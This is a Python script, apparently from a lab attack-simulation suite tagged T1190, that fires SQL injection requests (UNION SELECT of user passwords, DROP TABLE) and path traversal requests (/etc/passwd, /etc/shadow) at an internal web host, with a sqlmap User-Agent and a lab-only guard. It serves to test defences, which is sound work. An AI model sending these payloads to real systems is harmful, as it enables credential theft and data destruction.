"""T1190: SQL injection and path traversal requests at web01, through the firewall."""

import http.client
import socket
import time

from attacks.guard import assert_in_lab
from attacks.mgmt import TargetUnreachable

TARGET = "10.20.0.10"   # web01 on the LAN
PATHS = [
    "/order?id=1'%20OR%20'1'='1",
    "/order?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
    "/order?id=1;%20DROP%20TABLE%20orders--",
    "/../../../../etc/passwd",
    "/static/..%2f..%2f..%2fetc%2fpasswd",
    "/index.php?page=../../../../etc/shadow",
]


def run() -> None:
    assert_in_lab(TARGET)
    for path in PATHS:
        conn = http.client.HTTPConnection(TARGET, 80, timeout=5)
        try:
            conn.request("GET", path, headers={"User-Agent": "sqlmap/1.8"})
            status = conn.getresponse().status
            print(f"  {status} {path}")
        except (socket.timeout, TimeoutError, OSError) as exc:
            raise TargetUnreachable(f"web01 ({TARGET}) did not answer on port 80") from exc
        finally:
            conn.close()
        time.sleep(0.3)
